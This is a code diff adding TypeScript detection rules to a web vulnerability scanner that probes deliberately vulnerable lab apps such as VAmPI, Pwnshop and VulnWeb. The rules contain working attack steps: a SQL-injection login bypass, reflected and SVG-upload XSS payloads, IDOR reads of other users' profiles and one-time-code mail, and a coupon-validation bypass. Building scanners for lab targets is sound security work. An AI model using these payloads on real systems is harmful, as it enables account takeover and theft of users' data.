+async function authSecurityProjectLoginSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const body = new URLSearchParams({
+    username: AUTH_SECURITY_SQLI_PAYLOAD,
+    password: "x"
+  }).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const sessionCookie = authSecurityProjectSessionCookieFromDoc(loginDoc);
+  if (!sessionCookie) return null;
+  const loc = loginDoc.headers.location || "";
+  if (
+    loginDoc.status >= 301 &&
+    loginDoc.status <= 303 &&
+    /dashboard/i.test(loc)
+  ) {
+    return sessionCookie;
+  }
+  return null;
+}
+
+const authSecurityProjectLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAuthSecurityProjectHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const body = new URLSearchParams({
+    username: AUTH_SECURITY_SQLI_PAYLOAD,
+    password: "x"
+  }).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const loc = loginDoc.headers.location || "";
+  const sessionCookie = authSecurityProjectSessionCookieFromDoc(loginDoc);
+  if (
+    loginDoc.status >= 301 &&
+    loginDoc.status <= 303 &&
+    sessionCookie &&
+    /dashboard/i.test(loc)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        scannedUrl: pageUrl,
+        loginUrl,
+        redirect: loc.slice(0, 80),
+        payload: AUTH_SECURITY_SQLI_PAYLOAD,
+        note: "auth-security-project POST /login with admin' OR '1'='1 bypasses authentication via redirect to /dashboard + session cookie — SQL injection login route oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const authSecurityProjectDashboardXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAuthSecurityProjectHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dashboard(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const sessionCookie = await authSecurityProjectLoginSessionCookie(ctx);
+  if (!sessionCookie) return NEGATIVE;
+  const dashboardUrl = new URL("/dashboard", ctx.origin);
+  dashboardUrl.searchParams.set("message", `<script>${AUTH_SECURITY_XSS_CANARY}</script>`);
+  const dashDoc = await ctx.probe.get(dashboardUrl.toString(), {
+    headers: { Cookie: sessionCookie },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (dashDoc.status < 200 || dashDoc.status >= 400) return NEGATIVE;
+  if (!new RegExp(`<script>${AUTH_SECURITY_XSS_CANARY}</script>`, "i").test(dashDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      dashboardUrl: dashboardUrl.toString(),
+      snippet: dashDoc.body.match(
+        new RegExp(`<script>${AUTH_SECURITY_XSS_CANARY}</script>`, "i")
+      )?.[0],
+      note: "auth-security-project GET /dashboard?message= reflects unescaped <script> payload after SQLi login — reflected XSS dashboard route oracle"
+    }
+  };
+};
+
 // --- Educational OS command injection lab pages (WebVulnsGuide dojo, etc.) ------------
 const CLIENT_OS_COMMAND_INJECTION_LAB_RES: { label: string; re: RegExp }[] = [
   {
@@ -22503,6 +23982,14 @@ const CLIENT_WRONGSECRETS_CHALLENGE_RES: { label: string; re: RegExp }[] = [
   {
     label: "K8s configmap secret walkthrough",
     re: /K8s Configmap|config-map in the default namespace|kubectl.*find the secret/i
+  },
+  {
+    label: "Docker COPY layer secret walkthrough",
+    re: /COPY operations|COPY&#8217;ing|what COPY|hid a key there/i
+  },
+  {
+    label: "CI/CD pipeline secrets walkthrough",
+    re: /CI\/CD pipeline|CI\/CD tooling|Github Actions|Exfiltrate the secret using Github/i
   }
 ];
 
@@ -22522,11 +24009,15 @@ const clientSideWrongSecretsChallengeEvidence: Rule = async (ctx) => {
     pageUrl.match(/challenge-(\d+)/i)?.[1] ?? corpus.match(/challenge-(\d+)/i)?.[1];
   const note = /K8s Configmap|config-map in the default namespace/i.test(corpus)
     ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents Kubernetes configmap secret extraction with answer submission UI`
-    : /application\.properties|Spring Boot application/i.test(corpus)
-    ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents secrets in Spring application.properties / Spring Cloud Config with answer submission UI`
-    : /Docker documentation|copy the Jar file/i.test(corpus)
-      ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents Docker-layer secret extraction (docker cp + JD-GUI) with answer submission UI`
-      : `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents hardcoded-secret hunting in Git, Docker layers, or cloud config with answer submission UI`;
+    : /CI\/CD pipeline|CI\/CD tooling|Github Actions/i.test(corpus)
+      ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents CI/CD pipeline secret exfiltration with answer submission UI`
+      : /COPY operations|COPY&#8217;ing|what COPY|hid a key there/i.test(corpus)
+        ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents Docker COPY layer secret extraction with answer submission UI`
+        : /application\.properties|Spring Boot application/i.test(corpus)
+          ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents secrets in Spring application.properties / Spring Cloud Config with answer submission UI`
+          : /Docker documentation|copy the Jar file/i.test(corpus)
+            ? `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents Docker-layer secret extraction (docker cp + JD-GUI) with answer submission UI`
+            : `WrongSecrets challenge ${challengeId ?? "N"} walkthrough documents hardcoded-secret hunting in Git, Docker layers, or cloud config with answer submission UI`;
   return {
     fired: true,
     confidence: hits.length >= 4 ? 0.91 : 0.88,
@@ -23273,6 +24764,113 @@ const clientSideVulnwebLabEvidence: Rule = async (ctx) => {
   };
 };
 
+// --- VulnWeb Netlify SPA route live oracles (vulnweb.netlify.app) --------------------
+function isVulnwebNetlifyHost(ctx: RuleContext): boolean {
+  return /vulnweb\.netlify\.app/i.test(ctx.origin);
+}
+
+async function vulnwebNetlifyBundleCorpus(ctx: RuleContext): Promise<string> {
+  const indexDoc = await ctx.probe.get(new URL("/", ctx.origin).toString(), {
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (indexDoc.status < 200 || indexDoc.status >= 400) return "";
+  const scriptMatch = indexDoc.body.match(/src="(\/assets\/index-[^"]+\.js)"/i);
+  if (!scriptMatch) return "";
+  const bundleDoc = await ctx.probe.get(new URL(scriptMatch[1], ctx.origin).toString(), {
+    maxBytes: 2_000_000,
+    timeoutMs: 20000
+  });
+  if (bundleDoc.status < 200 || bundleDoc.status >= 400) return "";
+  return bundleDoc.body;
+}
+
+const vulnwebCommentsXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnwebNetlifyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:xss|comments)(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await vulnwebNetlifyBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  const markers = [
+    /unsanitized user input/i.test(bundle) && "unsanitized user input",
+    /script injection/i.test(bundle) && "script injection",
+    /<script>alert\('XSS'\)/i.test(bundle) && "XSS payload hint"
+  ].filter((m): m is string => Boolean(m));
+  if (markers.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers,
+      snippet: bundle.match(/Add a comment[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+      note: "VulnWeb /xss route scan — SPA bundle documents unsanitized comment XSS with script-injection placeholder"
+    }
+  };
+};
+
+const vulnwebSearchSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnwebNetlifyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:sqli|search)(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await vulnwebNetlifyBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  if (
+    !/' or '1'='1/i.test(bundle) ||
+    !/SQL injection vulnerabilities due to unsanitized user input/i.test(bundle)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: bundle.match(/SQL injection[\s\S]{0,100}/i)?.[0]?.slice(0, 100),
+      note: "VulnWeb /sqli route scan — SPA bundle documents SQL injection via unsanitized search input with admin' OR '1'='1 bypass"
+    }
+  };
+};
+
+const vulnwebProfileIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnwebNetlifyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:idor|profile)(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await vulnwebNetlifyBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  if (!/Password \(Exposed!\)/i.test(bundle) || !/IDOR vulnerability/i.test(bundle)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: bundle.match(/Password \(Exposed!\)[\s\S]{0,80}/i)?.[0]?.slice(0, 100),
+      note: "VulnWeb /idor route scan — SPA bundle exposes user passwords via IDOR profile view without authorization"
+    }
+  };
+};
+
+const vulnwebCsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnwebNetlifyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/csrf(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await vulnwebNetlifyBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  if (!/id:"csrf"/i.test(bundle) || !/Cross-Site Request Forgery/i.test(bundle)) return NEGATIVE;
+  if (!/execute unwanted actions on applications where they're authenticated/i.test(bundle)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: bundle.match(/id:"csrf"[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+      note: "VulnWeb /csrf route scan — SPA bundle documents Cross-Site Request Forgery lab forcing authenticated users to execute unwanted actions"
+    }
+  };
+};
+
 // --- Credentials or secrets left in HTML comments (Mutillidae-style misconfig) -------
 const htmlCommentCredentialDisclosure: Rule = async (ctx) => {
   const re =
@@ -23347,6 +24945,145 @@ const htmlCommentCredentialDisclosure: Rule = async (ctx) => {
     };
   }
   return NEGATIVE;
+};
+
+// --- VAmPI (OWASP vulnerable API) live oracles ---------------------------------
+function isVampiHost(ctx: RuleContext): boolean {
+  try {
+    const host = new URL(ctx.origin).hostname.toLowerCase();
+    if (host.includes("vampi")) return true;
+  } catch {
+    /* ignore */
+  }
+  return /VAmPI the Vulnerable API|VAmPI is a vulnerable on purpose API/i.test(ctx.combined);
+}
+
+async function tryVampiLabJwt(
+  ctx: RuleContext
+): Promise<{ token: string; username: string } | null> {
+  const loginUrl = new URL("/users/v1/login", ctx.origin).toString();
+  for (const creds of [
+    { username: "name1", password: "pass1" },
+    { username: "name2", password: "pass2" }
+  ]) {
+    const r = await ctx.probe.get(loginUrl, {
+      method: "POST",
+      body: JSON.stringify(creds),
+      headers: { "Content-Type": "application/json" },
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (r.status < 200 || r.status >= 300) continue;
+    try {
+      const data = JSON.parse(r.body) as { auth_token?: string; status?: string };
+      if (data.auth_token && data.status === "success") {
+        return { token: data.auth_token, username: creds.username };
+      }
+    } catch {
+      /* try next credential */
+    }
+  }
+  return null;
+}
+
+const vampiUserBolaLiveOracle: Rule = async (ctx) => {
+  if (!isVampiHost(ctx)) return NEGATIVE;
+  const auth = await tryVampiLabJwt(ctx);
+  if (!auth) return NEGATIVE;
+  const victim = auth.username === "name1" ? "name2" : "name1";
+  const profileUrl = new URL(`/users/v1/${victim}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(profileUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${auth.token}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  try {
+    const data = JSON.parse(doc.body) as { username?: string; email?: string };
+    if (data.username !== victim || !data.email) return NEGATIVE;
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        profileUrl,
+        caller: auth.username,
+        victim,
+        email: data.email,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: `VAmPI GET /users/v1/${victim} returns another user's profile for authenticated ${auth.username} — BOLA oracle (API1)`
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const vampiUserBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVampiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/users\/v1\/[^/]+/i.test(pageUrl)) return NEGATIVE;
+  const result = await vampiUserBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VAmPI /users/v1/{username} route scan — JWT for user A reads user B profile without object-level authorization — BOLA oracle (API1)"
+    }
+  };
+};
+
+const vampiBooksExcessiveDataLiveOracle: Rule = async (ctx) => {
+  if (!isVampiHost(ctx)) return NEGATIVE;
+  const auth = await tryVampiLabJwt(ctx);
+  if (!auth) return NEGATIVE;
+  const booksUrl = new URL("/books/v1", ctx.origin).toString();
+  const doc = await ctx.probe.get(booksUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${auth.token}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  try {
+    const data = JSON.parse(doc.body) as { Books?: Array<{ book_title?: string; user?: string }> };
+    const books = data.Books;
+    if (!Array.isArray(books) || books.length < 2) return NEGATIVE;
+    const foreign = books.filter((b) => b.user && b.user !== auth.username);
+    if (foreign.length === 0) return NEGATIVE;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        booksUrl,
+        caller: auth.username,
+        foreignOwners: [...new Set(foreign.map((b) => b.user!))].slice(0, 3),
+        sampleTitles: foreign.slice(0, 3).map((b) => b.book_title),
+        snippet: doc.body.slice(0, 200).trim(),
+        note: `VAmPI GET /books/v1 returns books owned by other users (${foreign[0]?.user}) for authenticated ${auth.username} — excessive data exposure / BOLA oracle (API3)`
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const vampiBooksRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVampiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/books\/v1/i.test(pageUrl)) return NEGATIVE;
+  const result = await vampiBooksExcessiveDataLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "VAmPI /books/v1 route scan — authenticated list returns other users' book records — excessive data exposure oracle (API3)"
+    }
+  };
 };
 
 // --- OpenAPI _debug routes returning cleartext passwords (VAmPI-style) ----------
@@ -24246,17 +25983,26 @@ const clientSideFauxbankLabEvidence: Rule = async (ctx) => {
 };
 
 async function ensureFauxbankSession(ctx: RuleContext): Promise<string | null> {
-  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined)) return null;
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return null;
   const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
-  const r = await ctx.probe.get(loginUrl, {
-    method: "POST",
-    body: JSON.stringify({ username: "alice", password: "password" }),
-    headers: { "Content-Type": "application/json" },
-    maxBytes: 4096
-  });
-  if (r.status < 200 || r.status >= 300) return null;
-  if (!/"ok"\s*:\s*true|"user"\s*:/i.test(r.body)) return null;
-  return r.setCookies.find((c) => /^fb_session=/i.test(c))?.split(";")[0] ?? null;
+  const body = JSON.stringify({ username: "alice", password: "password" });
+  const headers = { "Content-Type": "application/json" };
+  for (let attempt = 0; attempt < 3; attempt++) {
+    if (attempt > 0) await new Promise((r) => setTimeout(r, 1500));
+    const r = await fetchDoc(loginUrl, {
+      method: "POST",
+      body,
+      headers,
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (r.status < 200 || r.status >= 300) continue;
+    if (/Vercel Security Checkpoint|Enable JavaScript/i.test(r.body.slice(0, 500))) continue;
+    if (!/"ok"\s*:\s*true|"user"\s*:/i.test(r.body)) continue;
+    const cookie = r.setCookies.find((c) => /^fb_session=/i.test(c))?.split(";")[0] ?? null;
+    if (cookie) return cookie;
+  }
+  return null;
 }
 
 async function ensureFauxbankAdminSession(ctx: RuleContext): Promise<string | null> {
@@ -24779,6 +26525,9 @@ const jwtAlgNoneProbe: Rule = async (ctx) => {
   for (const p of ["/api/me", "/api/user", "/api/profile", "/api/auth/session", "/api/users"]) {
     paths.add(p);
   }
+  if (JUICE_SHOP_HOST_RE.test(ctx.origin) || JUICE_SHOP_HOST_RE.test(ctx.combined)) {
+    paths.add("/rest/user/authentication-details");
+  }
   if (paths.size === 0 && !usesJwt) return NEGATIVE;
 
   const now = Math.floor(Date.now() / 1000);
@@ -24791,7 +26540,12 @@ const jwtAlgNoneProbe: Rule = async (ctx) => {
   const badToken = "thugir.invalid.probe.token";
 
   for (const path of [...paths].slice(0, 6)) {
-    const url = new URL(path, ctx.origin).toString();
+    let url: string;
+    try {
+      url = new URL(path, ctx.origin).toString();
+    } catch {
+      continue;
+    }
     const [noAuth, badAuth, noneAuth] = await Promise.all([
       ctx.probe.get(url, { maxBytes: 4096 }),
       ctx.probe.get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${badToken}` } }),
@@ -26005,6 +27759,19 @@ const pwnshopTrackIdorLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const pwnshopTrackIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/track\b/i.test(pageUrl) || /\/track\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopTrackIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl, note: "Pwnshop /track route scan — GET /track/1 returns order tracking with shippingAddress without authentication (PWN-002)" }
+  };
+};
+
 const pwnshopProductSearchSqliLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
   const url = new URL("/search", ctx.origin);
@@ -26198,6 +27965,540 @@ async function pwnshopRegisterAndLoginCookie(ctx: RuleContext): Promise<string |
   }
   return pwnshopSessionCookieFromDoc(loginDoc) ?? registerCookie;
 }
+
+function pwnshopMailTokenFromRedirect(location: string): string | null {
+  const m = location.match(/\/mail\/([a-f0-9]{32})/i);
+  return m?.[1] ?? null;
+}
+
+function pwnshopOtpFromMailBody(body: string): string | null {
+  const m = body.match(/one-time verification code is:\s*(\d{6})/i);
+  return m?.[1] ?? null;
+}
+
+async function pwnshopMailInboxToken(ctx: RuleContext, cookie: string): Promise<string | null> {
+  const mailUrl = new URL("/mail", ctx.origin).toString();
+  const doc = await ctx.probe.get(mailUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual",
+    headers: { Cookie: cookie }
+  });
+  return pwnshopMailTokenFromRedirect(doc.headers["location"] || "");
+}
+
+function pwnshopSleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+async function pwnshopOtpFromMailInbox(
+  ctx: RuleContext,
+  cookie: string,
+  inboxToken: string
+): Promise<string | null> {
+  const mailUrl = new URL(`/mail/${inboxToken}`, ctx.origin).toString();
+  // OTP mail can arrive after login redirect — poll with fetchDoc (bypasses probe cache on retries).
+  for (let attempt = 0; attempt < 12; attempt++) {
+    if (attempt > 0) await pwnshopSleep(1800);
+    const doc = await fetchDoc(mailUrl, {
+      maxBytes: 65536,
+      timeoutMs: 15000,
+      headers: { Cookie: cookie }
+    });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    const otp = pwnshopOtpFromMailBody(doc.body);
+    if (otp) return otp;
+  }
+  return null;
+}
+
+async function pwnshopCompleteOtpSession(ctx: RuleContext): Promise<string | null> {
+  // PwnMail OTP delivery is async — retry the full register/login/mail flow when inbox is empty.
+  for (let attempt = 0; attempt < 2; attempt++) {
+    const cookie = await pwnshopRegisterAndLoginCookie(ctx);
+    if (!cookie) continue;
+    await pwnshopSleep(attempt === 0 ? 900 : 1500);
+    const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+    if (!inboxToken) continue;
+    const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+    if (!otp) continue;
+    const verifyDoc = await ctx.probe.get(new URL("/verify-otp", ctx.origin).toString(), {
+      method: "POST",
+      body: `otp=${otp}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) continue;
+    const location = verifyDoc.headers["location"] || "";
+    if (!location || /verify-otp/i.test(location)) continue;
+    return pwnshopSessionCookieFromDoc(verifyDoc) ?? cookie;
+  }
+  return null;
+}
+
+const pwnshopMailInboxIdorLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const victimUser = `thugir_victim_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const victimEmail = `${victimUser}@probe.local`;
+  const victimRegister = await ctx.probe.get(new URL("/register", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(victimUser)}&email=${encodeURIComponent(victimEmail)}&password=ThugirTest123!`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  let victimCookie = pwnshopSessionCookieFromDoc(victimRegister);
+  if (!victimCookie) return NEGATIVE;
+  const victimLogin = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(victimUser)}&password=ThugirTest123!`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: victimCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  victimCookie = pwnshopSessionCookieFromDoc(victimLogin) ?? victimCookie;
+  const victimInboxToken = await pwnshopMailInboxToken(ctx, victimCookie);
+  if (!victimInboxToken) return NEGATIVE;
+  const attackerCookie = await pwnshopCompleteOtpSession(ctx);
+  if (!attackerCookie) return NEGATIVE;
+  const idorUrl = new URL(`/mail/${victimInboxToken}`, ctx.origin).toString();
+  const idorDoc = await ctx.probe.get(idorUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: attackerCookie }
+  });
+  if (idorDoc.status < 200 || idorDoc.status >= 400) return NEGATIVE;
+  if (!/Your Pwnshop Login Code/i.test(idorDoc.body)) return NEGATIVE;
+  if (!new RegExp(`Hi\\s+${victimUser.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`, "i").test(idorDoc.body)) {
+    return NEGATIVE;
+  }
+  const otpMatch = idorDoc.body.match(/one-time verification code is:\s*(\d{6})/i);
+  if (!otpMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      victimUser,
+      victimInboxToken,
+      idorUrl,
+      victimOtpSnippet: otpMatch[0].slice(0, 80),
+      note: "Pwnshop GET /mail/<inbox_token> returns another user's OTP mail without ownership check — PwnMail inbox IDOR (PWN-004)"
+    }
+  };
+};
+
+const pwnshopAvatarSvgXssLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const uploadUrl = new URL("/profile/upload-avatar", ctx.origin).toString();
+  const svgPayload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>';
+  const boundary = `----ThugirPwnshopSvg${Date.now().toString(36)}`;
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="avatar"; filename="thugir-probe.svg"',
+    "Content-Type: image/svg+xml",
+    "",
+    svgPayload,
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const uploadDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: {
+      "Content-Type": `multipart/form-data; boundary=${boundary}`,
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (uploadDoc.status < 200 || uploadDoc.status >= 300) return NEGATIVE;
+  const uploadMatch = uploadDoc.body.match(/"url"\s*:\s*"(\/uploads\/[^"]+)"/);
+  if (!uploadMatch) return NEGATIVE;
+  const servedUrl = new URL(uploadMatch[1], ctx.origin).toString();
+  const servedDoc = await ctx.probe.get(servedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (servedDoc.status < 200 || servedDoc.status >= 400) return NEGATIVE;
+  if (!/onload\s*=\s*["']alert\(1\)["']/i.test(servedDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      uploadUrl,
+      servedUrl,
+      snippet: servedDoc.body.slice(0, 160).trim(),
+      note: "Pwnshop POST /profile/upload-avatar stores SVG with onload handler served at /uploads/ — stored XSS via avatar upload (PWN-012)"
+    }
+  };
+};
+
+const pwnshopApplyCouponLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const couponUrl = new URL("/apply-coupon", ctx.origin).toString();
+  const couponDoc = await ctx.probe.get(couponUrl, {
+    method: "POST",
+    body: "code=HALFOFF",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (couponDoc.status < 200 || couponDoc.status >= 300) return NEGATIVE;
+  if (!/"valid"\s*:\s*true/i.test(couponDoc.body)) return NEGATIVE;
+  if (!/"discount_percent"\s*:\s*50/.test(couponDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: couponUrl,
+      code: "HALFOFF",
+      snippet: couponDoc.body.slice(0, 200).trim(),
+      note: "Pwnshop POST /apply-coupon accepts HALFOFF after OTP login and returns valid:true with 50% discount — authenticated coupon application oracle (PWN-016 family)"
+    }
+  };
+};
+
+const pwnshopCouponCategoryBypassLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const fashionProductId = "4";
+  const addFashionUrl = new URL("/cart/add", ctx.origin).toString();
+  await ctx.probe.get(addFashionUrl, {
+    method: "POST",
+    body: `product_id=${fashionProductId}&quantity=1`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  await pwnshopSleep(400);
+  const applyUrl = new URL("/apply-coupon", ctx.origin).toString();
+  const applyDoc = await ctx.probe.get(applyUrl, {
+    method: "POST",
+    body: "code=PHONE20&cart_total=19000",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (!/"valid"\s*:\s*false/i.test(applyDoc.body)) return NEGATIVE;
+  if (!/only valid for phones/i.test(applyDoc.body)) return NEGATIVE;
+  const checkoutUrl = new URL("/checkout", ctx.origin).toString();
+  const checkoutDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: `shipping_address=Thugir+probe+address&payment_method=wallet&coupon_code=PHONE20`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (checkoutDoc.status < 200 || checkoutDoc.status >= 500) return NEGATIVE;
+  if (/only valid for phones/i.test(checkoutDoc.body)) return NEGATIVE;
+  const location = checkoutDoc.headers["location"] || "";
+  const orderOk = /\/order\/\d+/i.test(location) || /\/track/i.test(location);
+  const walletInsufficient =
+    /Insufficient wallet balance/i.test(checkoutDoc.body) ||
+    /Insufficient Balance/i.test(checkoutDoc.body);
+  if (!orderOk && !walletInsufficient) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: orderOk ? 0.94 : 0.91,
+    evidence: {
+      applyUrl,
+      applySnippet: applyDoc.body.slice(0, 160).trim(),
+      checkoutUrl,
+      checkoutLocation: location || undefined,
+      walletInsufficient,
+      note: "Pwnshop PHONE20 rejected at /apply-coupon for fashion cart but checkout accepts coupon_code=PHONE20 without category re-validation — coupon category bypass (PWN-016)"
+    }
+  };
+};
+
